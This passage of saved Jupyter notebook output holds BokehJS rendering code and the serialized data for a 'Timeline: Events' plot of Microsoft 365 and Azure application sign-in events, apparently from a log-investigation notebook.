cell.output_area.append_execute_result(NB_LOAD_WARNING)\n    }\n  }\n\n  if (root._bokeh_is_loading === 0) {\n    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n    run_inline_js();\n  } else {\n    load_libs(css_urls, js_urls, function() {\n      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n      run_inline_js();\n    });\n  }\n}(window));",
      "application/vnd.bokehjs_load.v0+json": ""
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "  <div id=\"a1f83ab5-466b-4e19-b5d2-eab1b65057c9\" data-root-id=\"p3334\" style=\"display: contents;\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": "(function(root) {\n  function embed_document(root) {\n  const docs_json = {\"cf038837-e86c-41a2-a55e-fbe9435dd1b0\":{\"version\":\"3.7.3\",\"title\":\"Bokeh Application\",\"roots\":[{\"type\":\"object\",\"name\":\"Column\",\"id\":\"p3334\",\"attributes\":{\"children\":[{\"type\":\"object\",\"name\":\"Figure\",\"id\":\"p3088\",\"attributes\":{\"width\":900,\"height\":300,\"x_range\":{\"type\":\"object\",\"name\":\"Range1d\",\"id\":\"p3098\",\"attributes\":{\"start\":1755239052715.6328,\"end\":1755294178766.833}},\"y_range\":{\"type\":\"object\",\"name\":\"Range1d\",\"id\":\"p3099\",\"attributes\":{\"start\":-0.16666666666666666,\"end\":5.166666666666667}},\"x_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p3100\"},\"y_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p3101\"},\"title\":{\"type\":\"object\",\"name\":\"Title\",\"id\":\"p3091\",\"attributes\":{\"text\":\"Timeline: Events\"}},\"renderers\":[{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p3279\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p3035\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p3036\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p3037\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"qgAAANkAAADaAAAA9wAAADcBAAA5AQAAPQEAAFoBAABeAQAAYAEAAGEBAACkAQAAqAEAALEBAACyAQAAswEAALQBAAC1AQAAtgEAALcBAAC7AQAAvgEAAMwBAADNAQAAzwEAANABAADRAQAA0gEAANMBAADUAQAA1QEAANYBAADXAQAA2AEAANsBAADdAQAAFQIAABYCAAAyAgAAMwIAADQCAAA1AgAANgIAADcCAABPAgAAXgIAAGICAABjAgAAbgIAAHACAABzAgAAfQIAAIwCAACSAgAAoAIAAKQCAACrAgAArAIAALICAAC1AgAAwAIAAA==\"},\"shape\":[61],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"Skype Web Experience On Office 365\",\"Microsoft Stream Portal\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"Skype Web Experience On Office 365\",\"O365 Suite UX\",\"O365 Suite UX\",\"Office 365 Exchange Online\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"Skype Web Experience On Office 365\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office 365 Exchange Online\",\"Skype Web Experience On Office 365\",\"Office 365 SharePoint Online\",\"SharePoint Online Web Client Extensibility\",\"Office 365 SharePoint Online\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"SharePoint Online Web Client Extensibility\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"Azure Portal\",\"Azure Portal\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office 365 Exchange Online\",\"Office365 Shell WCSS-Client\",\"Microsoft 365 Security and Compliance Center\",\"Microsoft 365 Security and Compliance Center\",\"Office 365 Exchange Online\",\"Microsoft Stream Portal\",\"Office365 Shell WCSS-Client\",\"Microsoft Cloud App Security\",\"Microsoft Cloud App Security\",\"Microsoft Cloud App Security\",\"Microsoft Cloud App Security\",\"Microsoft Cloud App Security\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Microsoft 365 Security and Compliance Center\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\"],\"shape\":[61],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"umMhy8qKeUK6k3TL34p5QrqTdMvfinlCutNFzN+KeUK6Y8rL34p5QrqzjHbhinlCuuMSkOKKeUK6g6GK4op5QrrTj4riinlCumPXiuKKeUK6Ax6L4op5Qrpz1rPfinlCunPWs9+KeUK6gxHH34p5QrpTgsrfinlCugO+yt+KeUK6A77K34p5QrpTgsrfinlCunMNy9+KeUK6cw3L34p5QrqDEcffinlCumPKy9+KeUK6M5iL4op5QrrT8Y7iinlCujOYi+KKeUK6g6GK4op5QrrjEpDiinlCusMViuKKeUK6Y9eK4op5QrrTj4riinlCujNZiuKKeUK686CK4op5QrozWYriinlCutPxjuKKeUK686CK4op5QroDHoviinlCuoMhkvaKeUK6gyGS9op5QroDecvKinlCusN0y8qKeUK6YyHLyop5QrqzWsvKinlCugN5y8qKeUK6k+XIyop5QrqT5cjKinlCurNay8qKeUK6s4x24Yp5QrrDFYriinlCuhP7WPWKeUK6E/tY9Yp5QroTUpj2inlCurO2XcuKeUK6s7Zdy4p5QrrDdMvKinlCunPjYtCKeUK6U/Fi0Ip5QrqzCGDQinlCukOLYtCKeUK6c+Ni0Ip5QrpT8WLQinlCukOLYtCKeUI=\"},\"shape\":[61],\"dtype\":\"float64\",\"order\":\"little\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\"},\"shape\":[61],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p3280\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p3281\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p3276\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p3277\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p3278\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p3289\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p3038\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p3039\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p3040\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"SQAAAEoAAAB4AAAA3gEAAA==\"},\"shape\":[4],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"Office 365 SharePoint Online\",\"Office 365 SharePoint Online\",\"Microsoft Forms\",\"Microsoft Forms\"],\"shape\":[4],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"uhNu4NqKeUK6E27g2op5QrrT0fHiinlCutPR8eKKeUI=\"},\"shape\":[4],\"dtype\":\"float64\",\"order\":\"little\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AQAAAAEAAAABAAAAAQAAAA==\"},\"shape\":[4],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p3290\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p3291\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p3286\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p3287\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p3288\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p3299\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p3041\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p3042\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p3043\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AgAAABYAAAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"Azure Portal\",\"Azure Portal\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"upPzS/GKeUK6k/NL8Yp5Qg==\"},\"shape\":[2],\"dtype\":\"float64\",\"order\":\"little\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AgAAAAIAAAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p3300\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p3301\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p3296\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p3297\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p3298\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p3309\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p3044\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p3045\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p3046\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AwAAAAkAAAAuAAAAOgAAAA==\"},\"shape\":[4],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\"],\"shape\":[4],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"utM+FPKKeUK60z4U8op5Qrrj7qTlinlCuuPupOWKeUI=\"},\"shape\":[4],\"dtype\":\"float64\",\"order\":\"little\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AwAAAAMAAAADAAAAAwAAAA==\"},\"shape\":[4],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p3310\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p3311\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p3306\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p3307\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p3308\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p3319\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p3047\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p3048\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p3049\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"JQAAACcAAABuAAAApAAAAA==\"},\"shape\":[4],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\"],\"shape\":[4],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"ujOhF+2KeUK6M6EX7Yp5QrqTSBftinlCupNIF+2KeUI=\"},\"shape\":[4],\"dtype\":\"float64\",\"order\":\"little\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"BAAAAAQAAAAEAAAABAAAAA==\"},\"shape\":[4],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p3320\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p3321\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p3316\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p3317\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p3318\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p3329\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p3050\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p3051\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p3052\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"QQAAAGAAAABpAAAAagAAALcAAAC5AAAAwQAAAOAAAADhAAAA4gAAAPAAAAA=\"},\"shape\":[11],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"Office 365 Exchange Online\",\"Office 365 Exchange Online\",\"Microsoft 365 Security and Compliance Center\",\"Office365 Shell WCSS-Client\",\"Microsoft 365 Security and Compliance Center\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Microsoft Cloud App Security\",\"Office365 Shell WCSS-Client\",\"Microsoft Cloud App Security\",\"Office365 Shell WCSS-Client\"],\"shape\":[11],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"umPuI+eKeUK6Y+4j54p5QrpzbSLninlCuuMoJOeKeUK6c20i54p5QrpzKiTninlCuvP1I+eKeUK6Uz1q54p5QrrjKCTninlCulM9aueKeUK6cyok54p5Qg==\"},\"shape\":[11],\"dtype\":\"float64\",\"order\":\"little\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"BQAAAAUAAAAFAAAABQAAAAUAAAAFAAAABQAAAAUAAAAFAAAABQAAAAUAAAA=\"},\"shape\":[11],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p3330\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p3331\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p3326\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p3327\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p3328\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}}],\"toolbar\":{\"type\":\"object\",\"name\":\"Toolbar\",\"id\":\"p3097\",\"attributes\":{\"tools\":[{\"type\":\"object\",\"name\":\"HoverTool\",\"id\":\"p3053\",\"attributes\":{\"renderers\":\"auto\",\"tooltips\":[[\"AppDisplayName\",\"@AppDisplayName\"],[\"TimeGenerated\",\"@TimeGenerated{%F 